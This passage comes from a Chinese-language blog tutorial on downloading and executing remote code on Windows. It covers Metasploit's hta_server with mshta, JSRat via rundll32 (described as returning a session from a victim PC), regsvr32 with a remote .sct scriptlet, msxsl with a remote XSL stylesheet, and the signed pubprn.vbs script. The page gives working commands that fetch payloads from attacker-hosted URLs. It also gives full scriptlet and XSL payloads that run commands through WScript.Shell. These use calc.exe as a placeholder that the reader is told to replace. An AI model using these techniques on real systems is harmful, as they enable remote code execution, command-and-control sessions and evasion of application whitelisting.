+</span></span><span class="line"><span class="cl">msf exploit<span class="o">(</span>windows/misc/hta_server<span class="o">)</span> &gt; exploit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 目标上</span>
+</span></span><span class="line"><span class="cl">mshta.exe http://192.168.1.109:8080/pKz4Kk059Nq9.hta
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>2.然后再在目标机器执行前面生成的hta：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mshta http://192.168.28.128/run.hta
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="12rundll32">12.rundll32</h3>
+<p>其实还是依赖于<code>WScript.shell</code>这个组件在这里我们使用<code>JSRat</code>来做演示，JSRat是一个命令和控制框架，仅为rundll32.exe和regsvr32.exe生成恶意程序(项目地址：https://github.com/Hood3dRob1n/JSRat-Py.git)。</p>
+<p>1.开始运行JSRat，监听本地8888端口。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./JSRat.py -i 192.168.0.115 -p <span class="m">8888</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2.通过url访问，可以查看到恶意代码，复制上面生成的代码</p>
+<p>3.在受害者PC运行该代码，将成功返回一个会话</p>
+<h3 id="13regsvr32">13.regsvr32</h3>
+<p>Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行</p>
+<p>在目标机上执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">regsvr32.exe /u /n /s /i:http://192.168.28.131:8888/file.sct scrobj.dll
+</span></span><span class="line"><span class="cl"><span class="c1"># file.sct需要我们自己来构造</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以通过自己构造.sct文件中要执行的命令，去下载执行我们的程序(这里以弹计算器为例)：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;?XML <span class="nv">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span>?&gt;
+</span></span><span class="line"><span class="cl">&lt;scriptlet&gt; 
+</span></span><span class="line"><span class="cl">    &lt;registration <span class="nv">progid</span><span class="o">=</span><span class="s2">&#34;ShortJSRAT&#34;</span> <span class="nv">classid</span><span class="o">=</span><span class="s2">&#34;{10001111-0000-0000-0000-0000FEEDACDC}&#34;</span> &gt; 
+</span></span><span class="line"><span class="cl">        &lt;script <span class="nv">language</span><span class="o">=</span><span class="s2">&#34;JScript&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">        &lt;!<span class="o">[</span>CDATA<span class="o">[</span> <span class="nv">ps</span> <span class="o">=</span> <span class="s2">&#34;cmd.exe /c calc.exe&#34;</span><span class="p">;</span> new ActiveXObject<span class="o">(</span><span class="s2">&#34;WScript.Shell&#34;</span><span class="o">)</span>.Run<span class="o">(</span>ps,0,true<span class="o">)</span><span class="p">;</span> <span class="o">]]</span>&gt; 
+</span></span><span class="line"><span class="cl">        &lt;/script&gt; 
+</span></span><span class="line"><span class="cl">    &lt;/registration&gt; 
+</span></span><span class="line"><span class="cl">&lt;/scriptlet&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="14msxslexe">14.MSXSL.EXE</h3>
+<p>msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。</p>
+<p>下载地址为：https://www.microsoft.com/en-us/download/details.aspx?id=21714</p>
+<p>msxsl.exe 需要接受两个文件，XML及XSL文件，可以远程加载，具体方式如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msxsl http://192.168.28.128/scripts/demo.xml http://192.168.28.128/scripts/exec.xsl
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>demo.xml</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;?xml-stylesheet type=&#34;text/xsl&#34; href=&#34;exec.xsl&#34; ?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;customers&gt;</span> 
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;customer&gt;</span> 
+</span></span><span class="line"><span class="cl"> 		<span class="nt">&lt;name&gt;</span>Microsoft<span class="nt">&lt;/name&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/customer&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/customers&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>exec.xsl（这里以弹计算器为例）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#39;1.0&#39;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;xsl:stylesheet</span> <span class="na">version=</span><span class="s">&#34;1.0&#34;</span> <span class="na">xmlns:xsl=</span><span class="s">&#34;http://www.w3.org/1999/XSL/Transform&#34;</span> <span class="na">xmlns:msxsl=</span><span class="s">&#34;urn:schemas-microsoft-com:xslt&#34;</span> <span class="na">xmlns:user=</span><span class="s">&#34;http://mycompany.com/mynamespace&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;msxsl:script</span> <span class="na">language=</span><span class="s">&#34;JScript&#34;</span> <span class="na">implements-prefix=</span><span class="s">&#34;user&#34;</span><span class="nt">&gt;</span> 
+</span></span><span class="line"><span class="cl">    function xml(nodelist) { var r = new ActiveXObject(&#34;WScript.Shell&#34;).Run(&#34;cmd /c calc.exe&#34;);   # 这里修改为我们要执行的命令
+</span></span><span class="line"><span class="cl">    return nodelist.nextNode().xml; }
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/msxsl:script&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">&#34;/&#34;</span><span class="nt">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">&#34;user:xml(.)&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/xsl:template&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/xsl:stylesheet&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="15pubprnvbs">15.pubprn.vbs</h3>
+<p>在Windows 7以上版本存在一个名为<code>PubPrn.vbs</code>的微软已签名WSH脚本，其位于<code>C:\Windows\System32\Printing_Admin_Scripts\en-US</code>，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给<code>GetObject()</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="s2">&#34;C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs&#34;</span> 127.0.0.1 script:https://gist.githubusercontent.com/xps/64acdkpodsk4566b04a/raw/a006a4 7e4075785016a62f7e5170ef36f5247cdb/test.sct
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>test.sct（和13一样，这里以弹计算器为例）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?XML version=&#34;1.0&#34;?&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;scriptlet&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;registration</span> 
+</span></span><span class="line"><span class="cl">              <span class="na">description=</span><span class="s">&#34;Bandit&#34;</span> 
+</span></span><span class="line"><span class="cl">              <span class="na">progid=</span><span class="s">&#34;Bandit&#34;</span> 
+</span></span><span class="line"><span class="cl">              <span class="na">version=</span><span class="s">&#34;1.00&#34;</span> 
+</span></span><span class="line"><span class="cl">              <span class="na">classid=</span><span class="s">&#34;{AAAA1111-0000-0000-0000-0000FEEDACDC}&#34;</span> 				                 <span class="na">remotable=</span><span class="s">&#34;true&#34;</span> <span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/registration&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;script</span> <span class="na">language=</span><span class="s">&#34;JScript&#34;</span><span class="nt">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;![CDATA[ 
+</span></span></span><span class="line"><span class="cl"><span class="cp">			var r = new ActiveXObject(&#34;WScript.Shell&#34;).Run(&#34;calc.exe&#34;); 
+</span></span></span><span class="line"><span class="cl"><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">]]&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/script&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/scriptlet&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title=2023-01-21&#32;16:47:23>更新于 2023-01-21&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"><span><a href="/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span><span><a href="https://github.com/shuai06/edit/main/content/posts/Windows%e5%91%bd%e4%bb%a4%e8%a1%8c%e4%b8%8b%e8%bd%bd%e6%96%87%e4%bb%b6%e6%96%b9%e6%b3%95.md" title="编辑此页"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">编辑此页</a></span></div>
+      <div class="post-info-share">
+        <span></span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/' class="post-tag">命令行下载文件</a><a href='/tags/shell/' class="post-tag">Shell</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/%E8%BF%94%E6%A0%A1%E8%80%83%E5%85%AD%E7%BA%A7/" class="post-nav-item" rel="prev" title="返校考六级"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>返校考六级</a>
+      <a href="/windows-sc%E5%91%BD%E4%BB%A4/" class="post-nav-item" rel="next" title="Windows sc命令与权限维持">Windows sc命令与权限维持<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="giscus">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="hugo-fixit/FixIt"
+            data-repo-id="R_kgDOGihPtQ"
+            data-category="General"
+            data-category-id="DIC_kwDOGihPtc4CApHX"
+            data-mapping="title"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div></article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.109.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.17-RC"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">
+              <a href="http://geoer.cn"target="_blank" rel="external nofollow noopener noreferrer">剑胆琴心</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;--bg-progress: #000;--bg-progress-dark: #fff;"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/algoliasearch/algoliasearch-lite.umd.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":true,"expired":false,"giscus":{"darkTheme":"dark_dimmed","lightTheme":"light"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"enablePWA":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"pangu":{"enable":true,"selector":"article"},"search":{"algoliaAppID":"YKOM6PKLUY","algoliaIndex":"index.zh-cn","algoliaSearchKey":"a44c110d3ac360be2c69cd79d34b77a8","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"watermark":{"content":"\u003cimg class=\"fixit-icon\" src=\"/images/avatar.png\" alt=\"FixIt logo\" /\u003e 剑胆琴心","enable":true,"height":21,"opacity":0.0125}};</script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
+</html>
